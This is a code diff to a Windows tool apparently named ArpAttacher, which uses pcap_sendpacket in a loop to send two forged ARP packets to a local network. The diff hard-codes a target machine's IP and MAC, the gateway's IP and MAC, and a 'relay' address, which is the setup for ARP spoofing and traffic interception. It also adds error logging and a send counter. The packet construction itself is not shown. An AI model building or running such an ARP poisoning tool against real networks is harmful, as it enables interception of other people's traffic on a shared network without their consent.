@@ -92,18 +92,20 @@ BOOL CArpAttacherDlg::OnInitDialog()
 		m_ifList.SetCurSel(0);
 	}
 
-	//this->m_strAttackIp="192.168.30.105";
-	//this->m_strAttackMac="50-e5-49-4c-e0-6f";
+	//cgj  192.168.30.132        94-de-80-1a-8d-93
+	this->m_strAttackIp="192.168.30.132";
+	this->m_strAttackMac="94-de-80-1a-8d-93";
 
-	this->m_strAttackIp="192.168.30.129";
-	this->m_strAttackMac="00-22-b0-e1-63-98";
+	//攻击目录的 ip和mac fq
+	//this->m_strAttackIp="192.168.30.129";
+	//this->m_strAttackMac="00-22-b0-e1-63-98";
 
-	//this->m_strGateWayIp="192.168.30.1";
-	//this->m_strGateWayMac="00-0f-e2-4c-7c-c6";
 
+	//路由的ip mac
 	this->m_strGateWayIp="192.168.30.1";
 	this->m_strGateWayMac="00-0f-e2-4c-7c-c6";  //00-0f-e2-4c-7c-c6
 
+	//中转 的ip 和mac
 	this->m_strFalseIp ="192.168.30.131";
 	this->m_strFalseMac ="90-2B-34-02-39-91";
 
@@ -176,8 +178,17 @@ DWORD Fun_Thread(LPVOID lpPara)
 	while(!pThis->m_bStop)
 	{
 	 
-		int ret=pcap_sendpacket(pThis->dev_handle,(const u_char *)&pThis->m_Packet1,sizeof(ARPPACKET));
+		int ret = 0;
+		ret=pcap_sendpacket(pThis->dev_handle,(const u_char *)&pThis->m_Packet1,sizeof(ARPPACKET));
+		if (0 != ret)
+		{
+			TRACE("发送m_Packet1失败！！！！");
+		}
 		ret=pcap_sendpacket(pThis->dev_handle,(const u_char *)&pThis->m_Packet2,sizeof(ARPPACKET));
+		if (0 != ret)
+		{
+			TRACE("发送m_Packet2失败！！！！");
+		}
 		sprintf(szTimes,"%u次",++dwTimes);
 		pThis->GetDlgItem(IDC_COUNT)->SetWindowTextA(szTimes);
 
